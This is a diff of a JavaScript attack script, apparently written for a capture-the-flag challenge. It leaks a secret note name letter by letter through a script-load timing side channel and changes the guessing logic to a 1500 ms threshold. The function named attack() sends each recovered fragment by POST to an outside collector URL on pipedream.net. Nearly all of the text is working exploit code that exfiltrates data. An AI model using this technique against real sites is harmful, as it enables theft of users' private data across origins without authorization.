@@ -4,23 +4,6 @@ function sendRequest(url) {
     xhr.open("POST", "https://eocvkn4m3kpce3q.m.pipedream.net");
     xhr.send(url);
 }
-
-function getKeyOfGreatestElement(dictionary) {
-    let maxKey = null;
-    let maxValue = -Infinity;
-  
-    for (const key in dictionary) {
-      if (dictionary.hasOwnProperty(key)) {
-        const value = dictionary[key];
-        if (value > maxValue) {
-          maxValue = value;
-          maxKey = key;
-        }
-      }
-    }
-  
-    return maxKey;
-  }
     
 async function attack() {
     sendRequest("test=true")
@@ -29,7 +12,6 @@ async function attack() {
     //suposing the flag is 32 characters long
     let i = 0;
     while (i < 10001 && noteName.length < 32) {
-        let times = {};
         let j = 0;
         while (i < 10001 && j < lowercase_letters.length) {
             const l = lowercase_letters[j];
@@ -45,7 +27,10 @@ async function attack() {
                     // When script loads, caculate the time it took to finish the request
                     script.onload = () => {
                         var time = performance.now() - start;
-                        times[l] = time;
+                        if (time > 1500) {
+                            noteName += l;
+                            sendRequest(`note_name=${noteName}`);
+                        }
                         resolve();
                     }
                     script.onerror = reject;
@@ -57,12 +42,6 @@ async function attack() {
                 continue;
             }
             j++;
-        }
-        let greatestValue = getKeyOfGreatestElement(times);
-        if (greatestValue != null) {
-            noteName += greatestValue;
-            //partially send the name to keep progress of the attack
-            sendRequest(`note_name=${noteName}`);
         }
     }      
     sendRequest("result=false");
